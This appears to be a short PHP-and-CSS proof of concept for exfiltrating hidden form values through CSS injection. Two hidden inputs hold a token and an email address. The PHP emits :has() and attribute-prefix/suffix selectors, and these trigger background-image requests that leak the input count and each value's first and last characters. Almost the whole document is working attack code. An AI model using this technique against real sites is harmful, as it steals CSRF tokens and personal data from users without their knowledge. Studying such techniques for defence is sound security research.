<input type="hidden" name="mytoken" value="ddaf35a193617abacc417349ae204">
<input type="hidden" name="email" value="gareth.heyes@portswigger.net">

<style>
<?php
$chrs = array_merge(range('a','z'),range(0,9));
$max = 20;
for($i=1;$i<$max;$i++) {
    echo 'body:has(input[type="hidden"]:nth-child('.$i.')){--inputCount: url(/?inputCount='.$i.');}'."\n";
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][value^="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'Begins: url(/?input'.$i.'Begins='.$chr.');}'."\n";
    }
}
foreach($chrs as $chr) {
    for($i=1;$i<$max;$i++) {
        echo 'body:has(input[type="hidden"][value$="'.$chr.'"]:nth-child('.$i.')){--input'.$i.'Ends: url(/?input'.$i.'Ends='.$chr.');}'."\n";
    }
}
?>    
body {
    background:var(--inputCount,none),
    <?php
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'Begins,none)');
    }
    echo join(",", $rules);
    echo ',';
    $rules = [];
    for($i=1;$i<$max;$i++) {
        array_push($rules, 'var(--input'.$i.'Ends,none)');
    }
    echo join(",", $rules);
    echo ';';
    ?>
}
</style>